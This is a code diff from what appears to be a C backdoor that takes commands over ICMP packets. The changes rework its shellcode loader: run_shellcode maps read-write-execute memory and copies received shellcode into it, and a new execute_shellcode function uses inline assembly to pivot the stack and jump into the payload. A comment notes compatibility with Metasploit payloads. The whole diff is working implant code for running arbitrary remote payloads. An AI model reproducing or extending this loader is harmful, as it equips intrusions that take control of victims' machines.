@@ -66,29 +66,41 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 	}
 }
 
+void execute_shellcode(const unsigned char *shellcode, const unsigned char *stack ) {
+	// We dont' care about the old stack or frame pointer
+	__asm__("pop %eax");
+	__asm__("pop %eax");
+
+	// Save the new eip
+	__asm__("pop %eax");
+	
+	// Set up the new stack
+	__asm__("pop %esp");
+
+	// Finally jump to the shellcode
+	__asm__("jmp *%eax");
+}
+
 void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 	unsigned char *executable = NULL, *new_stack = NULL;
 	
 	// We need some more memory to work
-	if((executable = mmap(NULL, size, 
-               PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, 
-               -1, 0)) != MAP_FAILED) {
-		
-		// Copy our prefix and shellcode in
-		memcpy(executable, shellcode, size);
-
-		// Create a new stack area for payloads that need writable/executable stack	
-		if ((new_stack = mmap(NULL, STACK_SIZE, 
-               PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED,
-               -1, 0)) != MAP_FAILED) {
-
-			// Some of the msfpayloads seem to eventually jump to the stack even though it's not executable
-         __asm__("mov -0x0C(%ebp),%eax");
-        	__asm__("mov -0x10(%ebp),%esp");
-        	__asm__("add $0x0100, %esp");
-         __asm__("jmp *%eax");
-		}
+        if((executable = mmap(NULL, size, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to mmap new executable area\n"));
+		return;
 	}
+	// Copy our prefix and shellcode in
+	if(memcpy(executable, shellcode, size) != executable) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to copy shellcode to new executable memory region\n"));
+		return;
+	}
+	// We need some more memory to work
+        if((new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
+		DEBUG_WRAP(fprintf(stderr, "Failed to mmap new stack area\n"));
+		return;
+	}
+
+	execute_shellcode(executable, new_stack + (STACK_SIZE / 2));
 }
 
 void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp) {
